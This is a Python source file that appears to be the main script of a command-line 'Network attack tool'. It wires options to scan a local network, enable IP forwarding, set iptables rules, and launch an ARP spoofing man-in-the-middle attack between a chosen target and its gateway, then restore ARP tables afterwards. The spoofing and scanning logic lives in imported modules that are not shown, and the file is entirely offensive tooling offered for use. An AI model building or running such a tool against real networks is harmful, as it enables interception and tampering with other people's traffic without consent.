import argparse
from arp_spoof import arp_spoof_attack, restore_arp
from network_scanner import scan_network
from dependency_manager import install_dependencies, enable_ip_forwarding, disable_ip_forwarding, setup_iptables, \
    clear_iptables,forward_config


def main():
    parser = argparse.ArgumentParser(description="Network attack tool")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan the network for devices")
    parser.add_argument("-t", "--target", help="IP address of the target for ARP spoofing")
    parser.add_argument("-g", "--gateway", help="IP address of the gateway (router)")
    parser.add_argument("-i", "--install", action="store_true", help="Install necessary dependencies")
    parser.add_argument("-a", "--attack", action="store_true", help="Start ARP spoofing attack")
    parser.add_argument("-r", "--restore", action="store_true", help="Restore ARP tables")
    print("test")
    args = parser.parse_args()
    forward_config()
    if args.install:
        install_dependencies()

    if args.scan:
        scan_network()

    if args.attack and args.target and args.gateway:
        enable_ip_forwarding()
        setup_iptables()
        try:
            arp_spoof_attack(args.target, args.gateway)
        except KeyboardInterrupt:
            print("\n[!] Stopping attack. Restoring ARP tables...")
            restore_arp(args.target, args.gateway)
            restore_arp(args.gateway, args.target)
            disable_ip_forwarding()
            clear_iptables()

    if args.restore and args.target and args.gateway:
        restore_arp(args.target, args.gateway)
        restore_arp(args.gateway, args.target)


if __name__ == "__main__":
    main()
